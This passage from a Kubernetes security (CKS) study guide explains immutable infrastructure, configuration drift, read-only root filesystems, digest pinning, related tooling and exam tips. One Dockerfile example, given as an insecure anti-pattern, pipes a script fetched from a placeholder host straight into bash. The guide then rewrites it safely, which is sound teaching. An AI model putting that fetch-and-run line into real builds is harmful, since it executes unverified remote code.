2. The change is **lost on pod restart** — next deployment wipes it
3. If the pod crashes overnight, the "fix" is gone and the bug returns
4. If the change caused the bug, you can't revert via Git — you have to remember what you changed
5. Scaled to 10 engineers across 200 services, this creates thousands of undocumented runtime modifications

### Configuration Drift at Scale

```
Month 1:   Fleet is 99% identical
Month 6:   Fleet is 85% identical (small drift)
Month 12:  Fleet is 70% identical (moderate drift)
Month 24:  Fleet is 50% identical (severe drift — "snowflake" servers everywhere)
Month 36:  Major incident — "Server 47 is different from all others,
            no one knows why, afraid to touch it, it serves 20% of traffic"
```

This is real — it happens to organizations that don't enforce immutability. The end state is a server that everyone is afraid to upgrade and no one understands.

### Security Without Immutability

Without `readOnlyRootFilesystem`:
- An attacker with RCE can persist indefinitely across pod restarts (if they modify image-layer-derived files that persist in the container's writable layer)
- Malware installers work because they can write to `/usr/bin`, `/tmp`, `/var`
- You cannot reliably answer "is this container running exactly what the image says it should run?"

### Mutable Deployments in CI/CD

If your deployment process is "SSH into prod server and pull new code" rather than image-based deployments:
- You can't roll back (there's no previous image to pull)
- You can't verify what's running (the image and the filesystem diverged)
- Partial deployments create server heterogeneity
- Deployment failures leave servers in mid-update states

---

## 13. Most Common Commands and Syntax

### Checking Container Immutability Settings

```bash
# Check if readOnlyRootFilesystem is set
kubectl get pod <pod-name> -o jsonpath='{.spec.containers[*].securityContext.readOnlyRootFilesystem}'

# Check all pods in a namespace
kubectl get pods -n production -o json | \
  jq '.items[] | {name: .metadata.name, readonly: .spec.containers[].securityContext.readOnlyRootFilesystem}'

# Get deployment image (to check pinning)
kubectl get deployment webapp -o jsonpath='{.spec.template.spec.containers[*].image}'
```

### Immutable Deployment Pattern

```bash
# Correct: Update image tag in Git, let GitOps handle it
# Or manually (non-GitOps):
kubectl set image deployment/webapp webapp=company/webapp:1.19

# Verify rollout
kubectl rollout status deployment/webapp

# Rollback if needed
kubectl rollout undo deployment/webapp

# Check rollout history
kubectl rollout history deployment/webapp
```

### Dockerfile Update (Nginx 1.18 → 1.19)

```dockerfile
# Before
FROM nginx:1.18

# After (from KodeKloud example)
FROM nginx:1.19
COPY nginx.conf /etc/nginx
ENTRYPOINT ["sh", "entrypoint.sh"]
```

```bash
# Build, tag, push, deploy
docker build -t company/webapp:nginx-1.19 .
docker push company/webapp:nginx-1.19
kubectl set image deployment/webapp webapp=company/webapp:nginx-1.19
kubectl rollout status deployment/webapp
```

### Enforcing Read-Only Filesystem

```yaml
# In Pod spec:
spec:
  containers:
  - name: app
    image: company/app:1.0
    securityContext:
      readOnlyRootFilesystem: true    # Key setting
      runAsNonRoot: true
      allowPrivilegeEscalation: false
    volumeMounts:
    - name: tmp
      mountPath: /tmp
  volumes:
  - name: tmp
    emptyDir: {}
```

### Rolling Update Configuration

```yaml
spec:
  strategy:
    type: RollingUpdate
    rollingUpdate:
      maxSurge: 25%          # 25% extra pods during update
      maxUnavailable: 0      # Never reduce available pods
```

### Image Digest Pinning

```bash
# Get the digest for an image
docker inspect --format='{{index .RepoDigests 0}}' nginx:1.19
# nginx@sha256:4d4d8bef8b4f2f2f3a4e3c5e7b8d3f9a2e1c4b7d8e9f0a1b2c3d4e5f6a7b8c9d

# Use digest in Deployment
# image: nginx@sha256:4d4d8bef8b4f2f2f3a4e3c5e7b8d3f9a2e1c4b7d8e9f0a1b2c3d4e5f6a7b8c9d
```

### Audit for Mutable Containers in the Cluster

```bash
# Find all containers without readOnlyRootFilesystem
kubectl get pods --all-namespaces -o json | jq '
  .items[] |
  select(.spec.containers[].securityContext.readOnlyRootFilesystem != true) |
  "\(.metadata.namespace)/\(.metadata.name)"
'

# Find containers using mutable image tags (not digest-pinned)
kubectl get pods --all-namespaces -o json | jq '
  .items[].spec.containers[] |
  select(.image | contains("@sha256:") | not) |
  .image
' | sort -u
```

---

## 14. Other Tools and Services Available

### 14.1 Image Building — Immutable Image Tooling

| Tool | Purpose | Immutability Feature |
|---|---|---|
| **Docker BuildKit** | Build container images | Layer caching, `--no-cache` for clean builds |
| **Buildah** | OCI image builder (rootless) | Build without Docker daemon |
| **Kaniko** | Build in Kubernetes CI | No Docker daemon needed |
| **ko** | Go binary → container image | Direct Go binary containerisation |
| **Jib** | Java → container (Maven/Gradle plugin) | Reproducible Java images |
| **Packer** | VM image builder | Immutable VM/AMI creation |
| **Nixpkgs** | Reproducible builds | Provably reproducible container images |

### 14.2 GitOps Tools

| Tool | CNCF Status | Key Feature |
|---|---|---|
| **ArgoCD** | Graduated | UI, multi-cluster, application health |
| **Flux CD** | Graduated | Lightweight, OCI support, Helm support |
| **Weave GitOps** | Commercial | GitOps with team collaboration |
| **Rancher Fleet** | CNCF Sandbox | Multi-cluster at scale |

### 14.3 Policy Enforcement for Immutability

| Tool | Approach | Immutability Enforcement |
|---|---|---|
| **Kyverno** | YAML policies | `require readOnlyRootFilesystem`, `require digest pinning` |
| **OPA Gatekeeper** | Rego policies | Custom constraints for immutability |
| **Pod Security Standards** | Built-in K8s | `restricted` profile encourages read-only FS |
| **Kubescape** | Scanning | Reports mutable containers in cluster |
| **Datree** | CI/CD integration | Pre-commit checks for immutability misconfigs |

### 14.4 Distroless and Minimal Images

| Image | Maintainer | Contents | Use For |
|---|---|---|---|
| `gcr.io/distroless/static` | Google | Nothing (truly minimal) | Static Go binaries |
| `gcr.io/distroless/base` | Google | glibc | Dynamic Go, Rust |
| `gcr.io/distroless/java17` | Google | JRE only | Java applications |
| `cgr.dev/chainguard/static` | Chainguard | Signed, daily rebuilt | Security-first Go apps |
| `cgr.dev/chainguard/python` | Chainguard | Python runtime only | Python apps |
| `alpine:3.x` | Alpine Linux | musl libc + busybox | Shell-needed images |
| `scratch` | Docker | Literally nothing | Static binaries |

---

## 15. How AI Is Impacting This Area

### 15.1 AI-Powered Drift Detection

ML models can detect configuration drift that goes beyond simple file differences:

```
Traditional drift detection: "Server3 has nginx 1.18, others have 1.19"
AI drift detection:
  - Behavioural drift: "Server3 is making 3x more syscalls than other servers — possible cryptominer"
  - Performance drift: "Server3's response latency is 20% higher — possible resource-stealing process"
  - Network drift: "Server3 is making external connections that Server1/2 are not"
```

### 15.2 AI-Generated Immutable Dockerfiles

LLMs can transform mutable Dockerfiles into immutable, secure versions:

```
Input Dockerfile (mutable, insecure):
FROM ubuntu:latest
RUN apt-get update && apt-get install -y curl
RUN curl http://setup.example.com/install.sh | bash
USER root

AI-generated immutable version:
FROM ubuntu:22.04@sha256:<digest>    # Pinned digest
RUN apt-get update && \
    apt-get install -y --no-install-recommends curl=<version> && \
    rm -rf /var/lib/apt/lists/*      # Clean up package cache
COPY install.sh /tmp/install.sh      # Copy from build context, not download
RUN sh /tmp/install.sh && rm /tmp/install.sh
USER 1000:1000                       # Non-root UID
```

### 15.3 Natural Language Policy Generation

```
"Generate a Kyverno policy that enforces: all containers in the 'production' 
namespace must have readOnlyRootFilesystem=true, must not use the 'latest' tag,
and must be pulled from our internal registry."

AI generates complete, correct Kyverno ClusterPolicy in seconds.
```

### 15.4 Automated Image Update PRs

AI-powered tools like Renovate Bot and Dependabot scan repositories for outdated base images and automatically open PRs with updates:

```
Renovate detects: FROM nginx:1.18 (outdated, CVEs present)
Opens PR:         FROM nginx:1.19 (latest stable, CVEs patched)
AI PR description: "Updates nginx from 1.18 to 1.19.
                   Addresses CVE-2023-XXXXX (CVSS 7.5 High).
                   CI pipeline has validated the new image.
                   Tests pass. Recommend merging within 24h."
```

This automates the immutability update cycle — humans review and merge, AI handles discovery and PR creation.

### 15.5 AI-Assisted Incident Response in Immutable Environments

When an immutable container shows anomalous behaviour (caught by Falco), AI can:

1. **Determine if the container is compromised** — compare filesystem state to image baseline automatically
2. **Assess blast radius** — "This container has read-only FS + no exec access + network policy limiting outbound. Maximum blast radius is: data in environment variables + network access to these 3 services."
3. **Generate remediation** — "Kill this pod. Pull new image with patched dependency. Update Deployment. Verify rollout."

All of this in seconds, before a human even opens a terminal.

---

## 16. CKS Exam Tips

The CKS exam tests conceptual understanding of mutable vs. immutable infrastructure AND practical implementation of immutability controls in Kubernetes.

### What the Exam Tests

| Competency | Frequency |
|---|---|
| Define mutable vs. immutable infrastructure | High |
| Explain configuration drift and why it's a problem | High |
| Implement `readOnlyRootFilesystem: true` in a Pod spec | Very High |
| Understand containers as an immutable model | High |
| Update a container via image update (not exec) | High |
| Configure emptyDir volumes for writable paths | Medium |
| Understand rolling update as the immutable change mechanism | Medium |

### Key Definitions to Memorise

**Mutable infrastructure:** Servers or containers that are modified in place during their lifetime. Software, config, and state change while the server/container continues running. Results in configuration drift over time.

**Immutable infrastructure:** Servers or containers that are never modified after creation. Any change requires creating a new server/container from an updated image and decommissioning the old one. Eliminates configuration drift.

**Configuration drift:** The divergence in software versions, packages, or configurations across servers that were intended to be identical, caused by failed or incomplete in-place updates.

**In-place update:** Modifying software on a running server without replacing the server itself. The classic mutable pattern.

### The KodeKloud Dockerfile Example

The exam may ask you to update a Dockerfile for immutability. Remember the pattern:

```dockerfile
# Change the FROM line to update the version
FROM nginx:1.19          # Was nginx:1.18
COPY nginx.conf /etc/nginx
ENTRYPOINT ["sh", "entrypoint.sh"]
```

Then rebuild and redeploy — never exec into a running container to update software.

### The `readOnlyRootFilesystem` Implementation

This is the most likely practical exam task related to this chapter:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: secure-pod
spec:
  containers:
  - name: app
    image: nginx:1.19
    securityContext:
      readOnlyRootFilesystem: true    # ← The key field
    volumeMounts:
    - name: tmp
      mountPath: /tmp                 # If app needs /tmp
  volumes:
  - name: tmp
    emptyDir: {}                      # Ephemeral writable space
```

### Exam Traps

**Trap 1: Confusing "immutable" with "unchangeable forever"**
→ Immutable containers CAN be updated — by replacing them with new containers from a new image. You don't modify running containers.

**Trap 2: Setting `readOnlyRootFilesystem: true` without providing writable volumes**
→ The app will fail if it needs to write anywhere. Always check if the app needs `/tmp` or similar, and provide emptyDir volumes.

**Trap 3: Thinking configuration drift only affects servers, not containers**
→ If you manually `kubectl exec` into containers and make changes, you've created configuration drift between your container instances.

**Trap 4: Using `latest` tag and thinking it's immutable**
→ `nginx:latest` changes over time — today it might be 1.25, tomorrow 1.26 after a push. Only `@sha256:` digest references are truly immutable.

### Quick Reference Table for the Exam

| Concept | Answer |
|---|---|
| What is mutable infrastructure? | In-place updates to running servers/containers |
| What is configuration drift? | Servers with different software versions after failed in-place updates |
| What causes configuration drift? | Missing dependencies, disk space, network issues during updates |
| How to fix configuration drift? | Switch to immutable infrastructure (replace, don't modify) |
| How to update a container immutably? | Update Dockerfile, rebuild image, kubectl set image |
| What is `readOnlyRootFilesystem`? | Security context setting that makes container FS read-only |
| Where to allow writes for app needs? | emptyDir volume mounts |
| What is the "rolling update" relevance? | It's Kubernetes' mechanism for replacing pods immutably |
| Why is distroless more immutable? | No shell or package manager to modify the container |

---

## 17. Links and References

- [Kubernetes Deployment Rolling Updates](https://kubernetes.io/docs/concepts/workloads/controllers/deployment/#rolling-update-deployment)
- [Kubernetes Pod Security Context](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [readOnlyRootFilesystem Documentation](https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.30/#securitycontext-v1-core)
- [Google Distroless Images](https://github.com/GoogleContainerTools/distroless)
- [Chainguard Images](https://edu.chainguard.dev/)
- [ArgoCD GitOps](https://argo-cd.readthedocs.io/)
- [Flux CD](https://fluxcd.io/docs/)
- [Kyverno Policies for Immutability](https://kyverno.io/policies/)
- [HashiCorp Packer — Immutable VM Images](https://developer.hashicorp.com/packer)
- [Renovate Bot — Automated Dependency Updates](https://docs.renovatebot.com/)
- [Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
- [Cosign Image Signing](https://github.com/sigstore/cosign)

---

*Chapter 5 of 6 — Monitoring, Logging and Runtime Security*
*Next: Chapter 6 — Ensure Immutability of Containers at Runtime*
